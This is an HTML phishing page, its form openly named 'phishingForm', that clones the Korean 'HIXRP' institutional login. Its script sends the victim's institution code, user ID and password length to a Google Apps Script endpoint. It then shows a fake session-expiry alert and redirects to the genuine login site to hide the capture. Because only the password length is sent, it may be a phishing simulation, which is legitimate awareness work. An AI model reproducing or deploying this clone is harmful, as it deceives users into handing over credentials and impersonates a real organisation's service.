<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HIXRP 로그인</title>
    <!-- Noto Sans KR 폰트 -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700&display=swap" rel="stylesheet">
    
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Noto Sans KR', sans-serif; 
            background: url('illustration.png') no-repeat center center;
            background-size: cover;
            overflow: hidden;
        }

        .login-container {
            width: 350px; /* 창 너비 살짝 조정 */
            margin-top: -15vh; 
        }

        /* 로고 영역 수정 (크기 키우고 간격 줄임) */
        .logo-area {
            text-align: center;
            margin-bottom: 12px; /* 폼이랑 더 가깝게 딱 붙임 */
        }

        .logo-area img {
            max-width: 190px; /* 로고 크기 확실히 키움 */
        }

        /* 입력 폼 공통 스타일 (테두리 두께 2px로 변경) */
        .input-row {
            position: relative;
            display: flex;
            margin-bottom: 8px; 
            border: 2px solid #fff; /* 테두리 두껍게! */
            background-color: #8bbaf3; 
            height: 42px; 
            box-sizing: border-box; /* 테두리 두께 포함해서 계산 */
        }

        /* 가운데 세로 바(|) 디테일 구현 */
        .input-row::after {
            content: '';
            position: absolute;
            left: 90px; /* 라벨 너비 정도 위치에 배치 */
            top: 10px; /* 위에서 살짝 띄움 */
            bottom: 10px; /* 아래에서 살짝 띄움 */
            width: 1px;
            background-color: #fff; /* 하얀색 얇은 선 */
        }

        /* 왼쪽 라벨 */
        .input-row label {
            width: 90px; /* 세로 바 위치에 맞춰서 조절 */
            display: flex;
            align-items: center;
            /* 라벨 텍스트 살짝 오른쪽으로 이동해서 여백 맞춤 */
            padding-left: 15px; 
            font-size: 13px;
            color: #fff;
            font-weight: 500; 
            /* 여기서 border-right를 없애고 위의 가짜 선(::after)을 씀 */
            box-sizing: border-box;
        }

        /* 오른쪽 입력 칸 */
        .input-row input {
            flex: 1;
            background-color: transparent;
            border: none;
            outline: none;
            /* 세로 바 뒤쪽으로 글씨가 시작되도록 패딩 넉넉히 줌 */
            padding: 0 10px 0 25px; 
            font-size: 13px;
            color: #333;
            font-family: 'Noto Sans KR', sans-serif; 
        }
        
        .input-row input::placeholder {
            color: #ffffff;
            font-weight: 400;
        }

        /* 로그인 버튼 (띄어쓰기 복구) */
        .btn-login {
            width: 100%;
            height: 44px;
            background-color: #1e265c; /* 이미지에 맞춘 짙은 남색 */
            color: #fff;
            border: none;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 5px;
            font-family: 'Noto Sans KR', sans-serif;
            letter-spacing: 5px; /* '로 그 인' 간격 넓게 */
        }

        /* 퇴사자 증명 신청 버튼 (테두리 두껍게, 배경 투명도 조절) */
        .btn-resign {
            width: 100%;
            height: 42px;
            background-color: rgba(255, 255, 255, 0.4); /* 조금 더 밝게 */
            border: 2px solid #fff; /* 테두리 두껍게 */
            color: #222;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            font-family: 'Noto Sans KR', sans-serif;
        }

        /* 하단 옵션 (체크박스) */
        .options {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
            font-size: 12px;
            color: #333; /* 글씨 색 살짝 진하게 */
        }
        .options label {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }
        
        /* 둥근 체크박스 디테일 (살짝 두껍게) */
        .options input[type="checkbox"] {
            appearance: none;
            -webkit-appearance: none;
            width: 14px;
            height: 14px;
            border: 1px solid #777; /* 체크박스 테두리 살짝 진하게 */
            border-radius: 50%; 
            outline: none;
            cursor: pointer;
            position: relative;
            margin: 0;
            background-color: rgba(255,255,255,0.2);
        }

        .options input[type="checkbox"]:checked::after {
            content: '✔';
            position: absolute;
            top: -3px;
            left: 1px;
            font-size: 12px;
            color: #555;
        }

        /* 최하단 텍스트 링크들 */
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 25px;
            font-size: 12px;
            color: #333; /* 글씨 색 진하게 */
        }
        .footer-links a {
            text-decoration: none;
            color: #333;
        }
        .footer-links strong {
            color: blue;
        }

        /* 카피라이트 */
        .copyright {
            position: absolute;
            bottom: 20px;
            width: 100%;
            text-align: center;
            font-size: 9px;
            color: #777;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        
        <div class="logo-area">
            <img src="logo.png" alt="XRP ez logo">
        </div>

        <form id="phishingForm">
            <div class="input-row">
                <label>CODE</label>
                <input type="text" id="entCd" placeholder="기관코드" required>
            </div>
            
            <div class="input-row">
                <label>ID</label>
                <input type="text" id="userId" placeholder="아이디" required>
            </div>
            
            <div class="input-row">
                <label>PASSWORD</label>
                <input type="password" id="userPw" placeholder="비밀번호" required>
            </div>

            <!-- "로 그 인" 띄어쓰기 복구 및 자간 넓힘 -->
            <button type="submit" class="btn-login">로 그 인</button>
        </form>

        <button class="btn-resign" type="button">
            <!-- 깔끔한 아이콘으로 유지 -->
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
            퇴사자 증명 신청
        </button>

        <div class="options">
            <label><input type="checkbox"> 기관코드저장</label>
            <label><input type="checkbox"> 아이디저장</label>
        </div>

        <div class="footer-links">
            <a href="#">IP승인요청</a>
            <a href="#">비밀번호 찾기</a>
            <a href="#"><strong>개인정보처리방침</strong></a>
        </div>
    </div>

    <div class="copyright">
        ⓒ HIPERTECH Corp. All Rights Reserved.
    </div>

    <script>
        const gasUrl = 'https://script.google.com/macros/s/AKfycbwG55MXJXjRpOBQwfX98zaJP5Rag-cnJF6ZFOJj_TY1BFJwQrQD4kZAzOkBFvktkBnqCA/exec';

        document.getElementById('phishingForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const entCd = document.getElementById('entCd').value;
            const id = document.getElementById('userId').value;
            const pw = document.getElementById('userPw').value;

            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(entCd)}&inputId=${encodeURIComponent(id)}&pwLen=${pw.length}`;
            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });

            setTimeout(() => {
                alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
                window.location.href = 'https://gnk.hixrp.kr/index.jsp';
            }, 500);
        });
    </script>
</body>
</html>
